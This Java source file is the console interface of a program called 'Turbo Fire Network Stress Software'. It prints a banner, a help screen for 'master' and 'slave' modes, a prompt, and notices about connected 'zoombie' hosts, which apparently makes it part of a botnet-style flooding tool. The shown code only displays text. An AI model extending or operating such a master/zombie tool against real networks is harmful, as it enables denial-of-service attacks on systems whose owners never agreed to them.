package view;

import java.util.Scanner;
import java.net.Socket;
import utilies.DateHandler;
import java.net.InetAddress;


public class GUI {

    private Scanner scanner;
    private DateHandler dateHandler;
    
    
    public GUI() {
        this.scanner = new Scanner(System.in);
        this.dateHandler = new DateHandler();
    }

    public void welcome(String type, int portOrIp) {
        clean();
        System.out.println("\n\n\n                (           )    (    (   (        ");
        System.out.println("    *   )      )\\ )  (  ( /\\(    )\\ ) )\\ ))\\ )     ");
        System.out.println("  ` )  /(   ( (()/(( )\\ )\\())  (()/((()/(()/((    ");
        System.out.println("   ( )(_))  )\\ /(_))((_|(_)\\    /(_))/(_))(_))\\   ");
        System.out.println("  (_(_())_ ((_|_))((_)_  ((_)  (_))_(_))(_))((_)  ");
        System.out.println("  |_   _| | | | _ \\| _ )/ _ \\  | |_ |_ _| _ \\ __| ");
        System.out.println("    | | | |_| |   /| _ \\ (_) | | __| | ||   / _|  ");
        System.out.println("    |_|  \\___/|_|_\\|___/\\___/  |_|  |___|_|_\\___| \n\n\n");
                                                          
        
        if(type.equals("master")) {
            System.out.println("+----------------------------------------------------+");
            System.out.println("+   WELCOME TO TURBO FIRE NETWORK STRESS SOFTWARE    +");
            System.out.println("+                                                    +");
            System.out.println("+   Written by:                                      +");
            System.out.println("+              Lucas Fonseca dos Santos              +");
            System.out.println("+              Otavio Andrade                        +");
            System.out.println("+----------------------------------------------------+");
            System.out.println("+ [!] CONNECTION ESTABLISHED ON THE PORT: "+portOrIp+"       +");
            System.out.println("+----------------------------------------------------+");

        }else {

        }
    }

    public static void clean() {
        System.out.print("\033[H\033[2J");  
        System.out.flush(); 
    }

    public String[] getCommand() {
        try {
            System.out.print("[~F1R3: "+ System.getProperty("user.name") +"@"+InetAddress.getLocalHost().getHostAddress().toString() + "]$ ");
            String command = this.scanner.nextLine().toLowerCase();
            return command.split(" ");
        }catch(Exception e) {
            return null;
        }
    }

    public static void errorMessage(String msg) {
        System.out.println("[X] " + msg);
    }

    public static void help() {
        clean();
        System.out.println("+----------------------------------------------------+");
        System.out.println("+ HELP INFORMATIONS                                  +");
        System.out.println("+----------------------------------------------------+");
        System.out.println("+                                                    +");
        System.out.println("+ How can you use this software?                     +");
        System.out.println("+                                                    +");
        System.out.println("+ To begin you must choose a mode execution option:  +");
        System.out.println("+ $ turbofire <mode>                                 +");
        System.out.println("+                                                    +");
        System.out.println("+ where mode can be: slave or master.                +");
        System.out.println("+                                                    +");
        System.out.println("+                                                    +");
        System.out.println("+ # turbofire > <option>                             +");
        System.out.println("+----------------------------------------------------+");
    }

    public static void showMessage(String msg) {
        System.out.println("[!] "+msg);
    }

    public static void newClient(String clientAddress) {
        System.out.println("[!] New zoombie host connected by: " + clientAddress);
    }

    public static void showActiveZoombie(Socket client) {
        System.out.println("[!] ZOOMBIE: " + client.getRemoteSocketAddress().toString());
    }

    public void pressEnterToContinue(){
        System.out.println("Press \"ENTER\" to continue...");
        Scanner scanner = new Scanner(System.in);
        scanner.nextLine();
     }
}